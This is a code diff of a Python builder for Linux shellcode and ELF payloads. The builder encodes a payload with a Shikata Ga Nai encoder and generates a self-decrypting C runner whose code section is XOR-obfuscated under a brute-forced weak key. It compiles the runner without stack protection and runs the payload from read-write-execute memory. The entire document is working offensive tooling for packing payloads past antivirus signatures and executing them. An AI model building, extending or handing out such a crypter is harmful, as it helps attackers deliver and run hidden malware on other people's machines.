@@ -9,7 +9,6 @@ import shutil
 import random
 
 # Import the ShikataGaNaiEncoder from our previous module.
-# (Assume that the encoder code is in shikata_encoder.py in the same directory.)
 try:
     from shikata_ga_nai import ShikataGaNaiEncoder
 except ImportError:
@@ -37,28 +36,15 @@ def detect_arch(elf_file):
 def generate_runner_c(encoded_payload, arch, raw_payload):
     """
     Generate a C source code string for the runner.
-    The runner:
-      - Contains a marker region between __decrypt_start and __decrypt_end.
-      - Contains an embedded encoded payload as a byte array.
-      - Has a self-decrypting function (brute-forcing a weak XOR key) that decodes
-        the region between markers.
-      - Allocates executable memory, copies the decoded payload there, and jumps to it.
-    Note: The payload is assumed to be a binary blob produced by our encoder.
+    The runner embeds the encoded payload as a byte array and places the
+    self-decrypting region (delimited by markers) into a dedicated section
+    (.decrypted) so that the markers and runner entry function are contiguous.
+    
+    The runner includes a self-decrypt routine that brute-forces a weak XOR key
+    (0x42) until the decrypted marker ("DECO") appears.
     """
-    # We embed a magic string into the region so that at runtime the runner
-    # can verify that decryption succeeded.
-    # The markers __decrypt_start and __decrypt_end delimit the region that will be XOR‑encoded.
-    #
-    # The runner’s self-decrypt function will iterate keys 0–255, XORing the region
-    # and checking if it sees the magic marker "DECO" (which we embed right after __decrypt_start).
-    #
-    # For simplicity, we assume that the region to encode is the runner’s main code area.
-    #
-    # The encoded payload is embedded as a C array named encoded_payload.
-    #
-    # The flag raw_payload determines whether the input was raw shellcode (to be executed directly)
-    # or a full ELF (in which case you might wish to call a loader function inside the payload).
-    c_code = f'''#include <stdio.h>
+    c_code = f'''\
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
@@ -66,19 +52,13 @@ def generate_runner_c(encoded_payload, arch, raw_payload):
 
 #define WEAK_KEY 0x42
 
-// Markers for the self-decrypting region.
+// The following items are placed in a dedicated section ".decrypted"
+// so that the self-decrypting region is contiguous.
+__attribute__((section(".decrypted")))
 char __decrypt_start[] = "DECO_START";
-char __decrypt_marker[] = "DECO";  // Expected marker after decryption.
-char __decrypt_end[]   = 'DECO_END';
 
-// Embedded encoded payload.
-unsigned char encoded_payload[] = {{
-{', '.join('0x{:02x}'.format(b) for b in encoded_payload)}
-}};
-size_t payload_size = sizeof(encoded_payload);
-
-// Function prototype for payload execution.
-void run_payload();
+__attribute__((section(".decrypted")))
+char __decrypt_marker[] = "DECO";
 
 // Self-decryption routine.
 // This function brute-forces the XOR key for the region between __decrypt_start and __decrypt_end.
@@ -111,12 +91,8 @@ void self_decrypt_region() {{
     exit(1);
 }}
 
-#if defined(__i386__) || defined(__x86_64__)
-__attribute__((naked))
-#endif
+__attribute__((section(".decrypted")))
 void runner_entry() {{
-    // This function is the entry point for the runner after self-decryption.
-    // It allocates executable memory, copies the decoded payload, and transfers control.
     self_decrypt_region();
     // Allocate executable memory for the payload.
     void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC,
@@ -126,7 +102,6 @@ void runner_entry() {{
         exit(1);
     }}
     memcpy(exec_mem, encoded_payload, payload_size);
-    // Flush instruction cache if necessary.
 #if defined(__i386__) || defined(__x86_64__)
     __builtin___clear_cache((char*)exec_mem, (char*)exec_mem + payload_size);
 #endif
@@ -136,9 +111,17 @@ void runner_entry() {{
     exit(0);
 }}
 
+__attribute__((section(".decrypted")))
+char __decrypt_end[]   = "DECO_END";
+
+// Embedded encoded payload.
+unsigned char encoded_payload[] = {{
+{", ".join("0x{:02x}".format(b) for b in encoded_payload)}
+}};
+size_t payload_size = sizeof(encoded_payload);
+
 int main(int argc, char *argv[]) {{
-    // The runner's self-decrypting region is between __decrypt_start and __decrypt_end.
-    // For demonstration purposes, we do nothing else here.
+    // Call the runner entry point in the self-decrypting region.
     runner_entry();
     return 0;
 }}
@@ -148,8 +131,8 @@ int main(int argc, char *argv[]) {{
 def compile_runner(c_source, arch, output_filename):
     """
     Compile the C source code into an ELF file.
-    Uses gcc. For x32, adds -m32; for x64, -m64 is assumed.
-    Also uses flags to disable stack protection and enable an executable stack.
+    Uses gcc. For x32, adds -m32; for x64, assumes -m64.
+    Flags disable stack protection and enable an executable stack.
     """
     tmp_dir = tempfile.mkdtemp(prefix="runner_build_")
     c_file = os.path.join(tmp_dir, "runner.c")
@@ -158,7 +141,6 @@ def compile_runner(c_source, arch, output_filename):
     gcc_cmd = ["gcc", c_file, "-o", output_filename, "-fno-stack-protector", "-z", "execstack"]
     if arch == "x32":
         gcc_cmd.insert(1, "-m32")
-    # For simplicity, we assume gcc is available and works.
     try:
         subprocess.check_call(gcc_cmd)
     except subprocess.CalledProcessError as e:
@@ -171,8 +153,8 @@ def postprocess_runner(runner_filename):
     Post-process the compiled ELF runner.
     This function opens the runner binary, locates the region between the markers
     "DECO_START" and "DECO_END", and XORs that region with a weak key (0x42).
-    The final ELF will not contain the key; the runner will brute-force at runtime.
-    For simplicity, this implementation scans the file as bytes.
+    The final ELF will not contain the decryption key explicitly; the runner
+    will brute-force it at runtime.
     """
     with open(runner_filename, "rb") as f:
         data = bytearray(f.read())
@@ -182,9 +164,9 @@ def postprocess_runner(runner_filename):
     end_idx = data.find(marker_end)
     if start_idx == -1 or end_idx == -1 or end_idx <= start_idx:
         sys.exit("Failed to locate decryption markers in the runner binary.")
-    # The region to encrypt is from start_idx to end_idx.
+    # XOR the region from marker start to marker end with the weak key.
     for i in range(start_idx, end_idx):
-        data[i] ^= 0x42  # weak XOR key
+        data[i] ^= 0x42
     with open(runner_filename, "wb") as f:
         f.write(data)
 
@@ -194,9 +176,9 @@ def main():
         epilog=(
             "Usage Examples:\n"
             "  1. Build a runner for a full ELF executable:\n"
-            "         python3 builder.py -f input.elf -o final_runner.elf\n\n"
+            "         python3 linux_builder.py -f input.elf -o final_runner.elf\n\n"
             "  2. Build a runner for raw shellcode (use --raw flag):\n"
-            "         python3 builder.py -f shellcode.bin --raw -o final_runner.elf\n"
+            "         python3 linux_builder.py -f shellcode.bin --raw -o final_runner.elf\n"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
@@ -205,23 +187,23 @@ def main():
     parser.add_argument("--raw", action="store_true", help="Indicate that the input file is raw shellcode rather than a full ELF")
     args = parser.parse_args()
 
-    # Detect architecture of the input file.
-    arch = detect_arch(args.file) if not args.raw else "x32"  # For raw shellcode, default to x32 (or add a flag)
+    # Detect architecture (for raw shellcode, default to x32 if not specified).
+    arch = detect_arch(args.file) if not args.raw else "x32"
     print(f"[+] Detected architecture: {arch}")
 
     # Read input file.
     with open(args.file, "rb") as f:
         payload_data = f.read()
 
-    # Instantiate the encoder (using basic options for now).
+    # Instantiate the encoder with basic options.
     encoder = ShikataGaNaiEncoder(arch=arch)
     # Encode the payload.
     encoded_payload = encoder.encode(payload_data)
     print(f"[+] Encoded payload size: {len(encoded_payload)} bytes")
 
-    # Generate runner C code with the encoded payload embedded.
+    # Generate the runner C code with the encoded payload embedded.
     runner_c_code = generate_runner_c(encoded_payload, arch, args.raw)
-    # Write and compile the runner.
+    # Compile the runner to a temporary file.
     runner_filename = args.output + ".tmp"
     compile_runner(runner_c_code, arch, runner_filename)
     print("[+] Runner compiled successfully.")
@@ -230,7 +212,7 @@ def main():
     postprocess_runner(runner_filename)
     print("[+] Runner post-processed (self-decrypting region XOR-encoded).")
 
-    # Rename/move the temporary runner file to final output.
+    # Rename/move the temporary runner file to the final output.
     shutil.move(runner_filename, args.output)
     print(f"[+] Final runner ELF generated: {args.output}")
 
